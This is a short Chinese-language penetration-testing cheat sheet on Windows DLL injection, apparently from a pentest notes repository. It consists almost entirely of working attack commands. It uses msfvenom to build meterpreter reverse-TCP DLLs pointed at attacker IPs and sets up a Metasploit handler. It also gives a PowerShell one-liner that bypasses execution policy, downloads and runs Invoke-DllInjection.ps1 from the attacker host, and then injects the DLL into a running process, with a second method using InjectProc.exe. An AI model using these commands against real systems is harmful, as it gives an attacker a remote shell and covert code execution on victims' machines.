  #### Powershell
	生成DLL
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=6666 -f dll -o /var/www/html/x.dll
	>use exploit/multi/handler
	>set payload windows/x64/meterpreter/reverse_tcp
	>Powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.105/powersploit/CodeExecution/Invoke-DllInjection.ps1'); Invoke-DllInjection -ProcessID pid -Dll .\1.dll"
  #### InjectProc
	生成DLL
	#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/qq.dll
	#use exploit/multi/handler
	#set payload windows/x64/meterpreter/reverse_tcp
	使用如下命令注入进程
	>InjectProc.exe dll_inj qq.dll xx.exe(存在的进程)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/477.png)